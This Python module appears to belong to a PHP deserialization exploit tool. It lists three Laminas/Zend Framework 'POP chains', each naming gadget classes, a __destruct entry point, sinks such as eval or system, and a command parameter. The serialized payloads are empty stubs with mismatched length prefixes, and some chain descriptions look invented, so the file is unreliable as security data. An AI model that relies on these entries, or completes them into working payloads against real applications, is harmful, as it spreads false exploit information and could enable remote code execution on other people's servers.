"""Laminas/Zend Framework POP chains."""
from . import POPChain

LAMINAS_CHAINS: list = [
    POPChain(
        name="laminas_pdo_fetch_class",
        framework="Laminas",
        gadget_classes=["Laminas\\Db\\Adapter\\Driver\\Pdo\\Connection", "IteratorIterator"],
        entry_point="__destruct",
        sink="PDO::FETCH_CLASS (object injection)",
        command_param="dsn",
        serialize_code=r"""b'O:8:"Laminas":0:{}'""",
        notes="Laminas PDO FETCH_CLASS deser. Control DSN for PDO connection, FETCH_CLASS instantiates attacker-controlled class.",
    ),
    POPChain(
        name="zend_log_writer_mail",
        framework="Laminas",
        gadget_classes=["Zend\\Log\\Writer\\Mail", "Zend\\Mail\\Message"],
        entry_point="__destruct",
        sink="eval(...)",
        command_param="body",
        serialize_code=r"""b'O:8:"ZendMail":0:{}'""",
        notes="Zend Framework 2.x. Zend\\Log\\Writer\\Mail::__destruct -> send() -> eval in body.",
    ),
    POPChain(
        name="laminas_tag_cloud_rce",
        framework="Laminas",
        gadget_classes=["Laminas\\Tag\\Cloud\\Decorator\\HtmlCloud"],
        entry_point="__destruct",
        sink="system(...)",
        command_param="tag",
        serialize_code=r"""b'O:8:"Laminas":0:{}'""",
        notes="Laminas Tag Cloud decorator deserialization RCE.",
    ),
]
